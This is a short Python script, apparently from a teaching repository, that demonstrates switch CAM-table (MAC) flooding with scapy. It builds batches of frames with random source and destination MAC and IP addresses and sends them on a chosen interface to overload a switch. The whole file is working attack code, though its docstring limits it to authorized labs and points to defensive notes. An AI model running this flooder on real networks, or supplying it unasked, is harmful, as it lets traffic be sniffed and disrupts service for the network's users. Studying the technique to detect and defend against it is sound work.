#!/usr/bin/env python3
"""Switch CAM-table (MAC) flooding demonstration.

EDUCATIONAL / AUTHORIZED-TESTING USE ONLY. Run only inside an isolated lab
network you own, or with explicit written permission. See this folder's
README.md for how the technique works and, more importantly, how to detect
and defend against it.

This is a legacy learning exercise, refactored to modern Python 3 for
readability. It is a reference implementation, not a turnkey tool.
"""

from __future__ import annotations

from scapy.all import IP, Ether, RandIP, RandMAC, sendp

DEFAULT_PACKET_COUNT = 1000


def build_random_frames(count: int) -> list:
    """Build *count* Ethernet/IP frames with random source and destination addresses.

    Building the batch up front and sending it in one call keeps the send rate
    high, which is what gives the CAM table no time to settle.
    """
    return [
        Ether(src=RandMAC(), dst=RandMAC()) / IP(src=RandIP(), dst=RandIP())
        for _ in range(count)
    ]


def mac_flood(interface: str, packet_count: int = DEFAULT_PACKET_COUNT) -> None:
    """Flood *interface* with frames bearing random MACs to overload the CAM table."""
    sendp(build_random_frames(packet_count), iface=interface, verbose=0)
